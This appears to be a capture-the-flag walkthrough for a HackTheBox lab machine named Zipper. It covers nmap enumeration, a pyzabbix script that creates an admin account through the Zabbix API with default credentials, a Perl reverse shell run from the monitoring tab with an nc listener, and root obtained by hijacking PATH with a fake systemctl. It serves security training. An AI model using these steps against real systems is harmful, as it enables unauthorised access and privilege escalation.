# Zipper
### Info:
OS: Linux<br>
IP: 10.10.10.108<br>
Difficulty : easy <br>
### Enumeration:
```nmap -sC -sV -oA nmap 10.10.10.108``` <br>

gives us the results : <br>
![alt text](https://i.imgur.com/IeLn6LJ.png)
Running dirbuster on port 80 we get:
![alt text](https://i.imgur.com/rqpHarW.png) <br>
### Exploitation:
As we see `zabbix` we can create a new user with the following script:
```
#!/usr/bin/env python
from pyzabbix import ZabbixAPI
import sys
import logging

stream = logging.StreamHandler(sys.stdout)
stream.setLevel(logging.DEBUG)
log = logging.getLogger('pyzabbix')
log.addHandler(stream)
log.setLevel(logging.DEBUG)
zapi = ZabbixAPI("http://10.10.10.108/zabbix")
zapi.login("zapper", "zapper")
print ("Connected to %s" % zapi.api_version() )

zapi.do_request('user.create',
   {
  "alias": "root",
        "passwd": "root",
        "type": 3,
        "usrgrps": [
            {
                "usrgrpid": "11"
            }

]
   }

)
```
Now we can write a script and run it via monitoring tab as shown:
![alt text](https://i.imgur.com/aKvCxD5.png) <br>
We use perl script specifically because -e tab in nc script spwaned and closed the shell immediately. <br>
Listening via `nc -lvnp 1234` gave us a shell <br>
Vulnerability Exploited: reverse tcp via perl script<br>
### Privilege Escaltion:
![alt text](https://i.imgur.com/evDbKSl.png) <br>
We see an suid bit and saw the script calling systemctl, therefore we created a systemctl under /tmp whith /bin/bash
and did `export PATH=/tmp:$PATH`. Therefore running the service gave us the root. <br>
### KNOWLEDGE GAIN:
Zabbix api end point vulns <br>
Reverse tcp via perl <br>
Linux Privesc via PATH variable.
